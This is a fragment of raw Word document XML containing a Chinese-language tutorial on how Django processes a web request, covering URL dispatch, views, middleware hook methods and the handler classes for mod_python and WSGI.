          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>可以处理</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友好</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>URL”</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的关键步骤，每个这样的函数都要返回一个</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实例。此时一般的做法是通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> loader </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>加载</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> template </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>并生成页面内</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容，其中重要的就是通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> ORM </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>技术从数据库中取出数据，并渲染到</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Template </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中，从而生成具体的页面了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA01BB1"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5. 处理Response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625341A5"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返回</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给</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> flup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flup </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>就取出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的内容返回给</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>服务器，由后者返回给浏览器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F0A49CF"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总之，</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在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> fastcgi </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中主要做了两件事：处理</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和创建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而它们对应的核心就是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>“urls</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>分析</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模板技术</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“ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>技术</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BE4F22" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00CF0D9D">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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="390A637F" wp14:editId="5E97E44A">
            <wp:extent cx="3689685" cy="3264432"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="40" name="图片 40" descr="12">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59158" cy="3325898"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EEA962"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lastRenderedPageBreak/>
        <w:t>如图所示，一个</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请求，首先被转化成一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象，然后该对象被传递给</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中间件处理，如果该中间件返回了</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，则直接传递给</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中间件做收尾处理。否则的话</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中间件将访问</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配置，确定哪个</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来处理，在确定了哪个</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要执行，但是还没有执行该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的时候，系统会把</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传递给</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中间件处理器进行处理，如果该中间件返回了</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，那么该</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直接被传递给</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中间件进行后续处理，否则将执行确定的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函数处理并返回</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，在这个过程中如果引发了异常并抛出，会被</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Exception</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3224">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中间件处理器进行处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E5133C" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00E50F7D" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="59" w:name="t5"/>
      <w:bookmarkEnd w:id="59"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>六、</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>详细全流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041F9761" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00E50F7D" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="120" w:after="240" w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Request </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>到达了！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFF08A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首先发生的是一些和</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>有关</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前期准备）的其他事情，分别是：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FBD32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如果是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Apache/mod_python </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>提供服务，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">request </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>由</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> mod_python </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>创建的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.handlers.modpython.ModPythonHandler </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>实例传递给</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE0228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如果是其他服务器，则必须兼容</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，这样，服务器将创建一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.handlers.wsgi.WsgiHandler </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>实例。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2099B16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这两个类都继承自</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.handlers.base.BaseHandler</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，它包含对任何类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型的</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来说都需要的公共代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433832EF"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0" w:name="sec7"/>
      <w:bookmarkEnd w:id="60"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>有一个处理器</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(Handler)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E06C53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当上面其中一个处理器实例化后，紧接着发生了一系列的事情：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C92A12"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这个处理器（</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>handler</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>）导入你的</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配置文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745FD2DF"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这个处理器导入</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的自定义异常类。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B29A927"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3. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>这个处理器调用它自己的 load_middleware 方法，加载所有列在 MIDDLEWARE_CLASSES中的 middleware 类并且内省它们</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284B05A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最后一条有点复杂，我们仔细瞧瞧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61239766"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一 个 middleware 类可以渗入处理过程的四个阶段：request，view，response 和 exception。要做到这一点，只需要定义指定的、恰当的方 法：process_request，process_view， process_response 和 process_exception。middleware 可以定义其中任何一个或所有这些方法，这取 决于你想要它提供什么样的功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7420D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当处理器内省</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时，它查找上述名字的方法，并建立四个列表作为处理器的实例变量：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1B8F9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_request_middleware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process_request </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>方法的列表（在每一</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种情况下，它们是真正的方法，可以直接调用），这些方法来自于任一个定</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4B60B7B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_view_middleware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process_view </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>方法的列表，这些方法来自</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于任一个定义了它们的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5875179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_response_middleware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process_response </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>方法的列表，这些</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方法来自于任一个定义了它们的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1F15C39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3. _exception_middleware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process_exception </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>方法的列表，这</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些方法来自于任一个定义了它们的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20FDF86A"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1" w:name="sec8"/>
      <w:bookmarkEnd w:id="61"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>绿灯：现在开始</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2FAB96"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现在处理器已经准备好真正开始处理了，因此它给调度程序发送一个信号</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> request_started</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内部的调度程序允许各种不同的组件声明它们正在干</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什么，并可以写一些代码监听特定的事件。关于这一点目前还没有官方的文档，</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但在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> wiki</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>上有一些注释。）。</w:t>
      </w:r>
